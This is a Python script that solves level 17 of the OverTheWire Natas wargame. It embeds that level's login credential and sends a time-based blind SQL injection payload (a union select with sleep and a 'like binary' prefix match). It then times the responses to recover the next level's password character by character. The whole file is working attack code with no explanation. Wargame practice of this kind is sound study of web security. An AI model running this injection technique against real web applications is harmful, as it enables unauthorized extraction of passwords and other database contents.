#!/usr/bin/python
import httplib
import urllib
import base64
import requests
import time

password = ''
possibleChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

headers = {}
http_username = "natas17"
http_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = "http://%s:%s@natas17.natas.labs.overthewire.org/index.php" % (http_username, http_password)
maxDeviation = 0.8

data = {'username': "natas17"}
startTime = time.time()
r = requests.post(url, data=data)
stdTime = time.time() - startTime


while len(password) < 32:
    found = False
    for ch in possibleChars:
        data = {'username': "natas17\" union select sleep(1), '' from users where username = \"natas18\" and password like binary '%s%s%%' -- " % (password,ch)}

        startTime = time.time()
        r = requests.post(url, data=data)
        t = time.time() - startTime

        if r.status_code != 200:
            print "Server returned error!"
            print data
            break

        if t > stdTime + maxDeviation:
            password = password + ch
            print password
            found = True
            break

    if found == False:
        print "Error while searching! Nothing found!"
        break

print "Password: %s" % password
